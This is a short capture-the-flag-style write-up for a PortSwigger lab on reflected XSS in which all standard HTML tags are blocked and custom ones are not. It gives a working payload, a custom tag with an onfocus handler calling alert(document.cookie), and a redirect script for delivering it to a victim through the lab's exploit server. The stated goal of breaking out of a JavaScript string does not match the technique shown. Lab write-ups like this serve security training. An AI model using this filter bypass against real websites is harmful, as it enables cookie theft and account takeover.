# Reflected XSS into HTML context with all tags blocked except custom ones

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal - 

Perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

### Analysis/Exploitation

```javascript
<my-tag onfocus='alert(document.cookie)' id='x' tabindex='1'>
```

**onfocus** — Event that is triggered when an element becomes the active element in the document, meaning it is selected for interaction. This can occur through various user actions, such as clicking on the element with the mouse, tabbing to the element using the keyboard, or tapping on the element on touch-enabled devices.

**alert(document.cookie)** — This code triggers an alert dialog displaying the value of the document’s cookie.

**id=’x’** — The id attribute uniquely identifies an element within the document, which can be useful for targeting the element with CSS or JavaScript.

**tabindex=’1' **— This attribute specifies the order in which elements receive focus when navigating the page using the keyboard’s Tab key.

At the end of your lab’s URL, add ‘#x’,
Adding ‘#x’ to the end of your URL is telling the browser to open this page, then immediately ‘tab’ to ‘id=x’. And this will trigger our pop-up.

```javascript
//Copy lab url and paste inside
<script>
location = “paste url”
</script>
```

Then deliver it to victim via exploit server

```javascript
<script>
location="https://0a7200c504c0ae4a81962547000200ba.web-security-academy.net/?search=<my-tag+onfocus%3D'alert(document.cookie)'+id%3D'x'+tabindex%3D'1'>#x"
</script>
```

## PortSwigger Lab

**Official lab:** Reflected XSS into HTML context with all tags blocked except custom ones

**PortSwigger:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
